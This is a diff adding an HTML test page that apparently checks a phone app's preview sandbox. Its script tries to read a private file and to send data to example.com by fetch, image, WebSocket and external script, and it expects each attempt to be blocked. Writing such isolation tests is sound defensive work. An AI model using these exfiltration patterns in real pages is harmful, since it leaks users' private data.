@@ -1,0 +1,29 @@
+<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Preview isolation check</title>
+<style>body{font:17px -apple-system,sans-serif;padding:24px}li{margin:6px 0}</style></head>
+<body>
+<h1>Preview isolation check</h1>
+<p>This made-up site tries to read a private file and send data off the phone. Every line must say blocked.</p>
+<ul id="results"></ul>
+<script>
+// A hostile preview: each attempt must fail. The result goes to the console for MAIPA-G's check.
+const results = {};
+function show(name, value) { results[name] = value; const li = document.createElement('li'); li.textContent = name + ': ' + value; document.getElementById('results').appendChild(li); }
+// A request that neither succeeds nor fails within 8 seconds is not counted as blocked.
+const TIMEOUT = 'timed out';
+async function attempt(name, run) {
+  try { await Promise.race([run(), new Promise((_, no) => setTimeout(() => no(new Error(TIMEOUT)), 8000))]); show(name, 'LEAKED'); }
+  catch (error) { show(name, error && error.message === TIMEOUT ? TIMEOUT : 'blocked'); }
+}
+(async () => {
+  await attempt('private repo file', async () => { const r = await fetch('maipag-preview://site/PreviewFixture.html'); if (!r.ok) throw new Error(String(r.status)); await r.text(); });
+  await attempt('fetch to another host', async () => { await fetch('https://example.com/?leak=maipa-g', { mode: 'no-cors' }); });
+  await attempt('picture from another host', () => new Promise((ok, no) => { const i = new Image(); i.onload = ok; i.onerror = no; i.src = 'https://example.com/favicon.ico?leak=maipa-g'; }));
+  await attempt('WebSocket to another host', () => new Promise((ok, no) => { try { const s = new WebSocket('wss://example.com/leak'); s.onopen = ok; s.onerror = no; } catch (e) { no(e); } }));
+  await attempt('script from another host', () => new Promise((ok, no) => { const s = document.createElement('script'); s.onload = ok; s.onerror = no; s.src = 'https://example.com/leak.js'; document.head.appendChild(s); }));
+  console.log('MAIPAG-ISOLATION ' + JSON.stringify(results));
+})();
+</script>
+</body>
+</html>
